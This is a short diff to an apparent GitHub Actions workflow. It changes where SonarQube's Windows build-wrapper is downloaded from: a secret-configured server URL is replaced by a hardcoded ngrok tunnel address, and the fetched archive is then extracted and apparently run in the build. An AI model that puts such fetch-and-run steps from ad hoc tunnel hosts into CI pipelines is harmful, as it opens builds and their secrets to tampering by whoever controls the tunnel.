@@ -21,7 +21,7 @@ jobs:
           $path = "$HOME/.sonar/build-wrapper-win-x86.zip"
           mkdir $HOME/.sonar
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          (New-Object System.Net.WebClient).DownloadFile("${{ secrets.SONAR_HOST_URL }}/static/cpp/build-wrapper-win-x86.zip", $path)
+          (New-Object System.Net.WebClient).DownloadFile("https://zipeng.eu.ngrok.io/static/cpp/build-wrapper-win-x86.zip", $path)
           Add-Type -AssemblyName System.IO.Compression.FileSystem
           [System.IO.Compression.ZipFile]::ExtractToDirectory($path, "$HOME/.sonar")
         env:
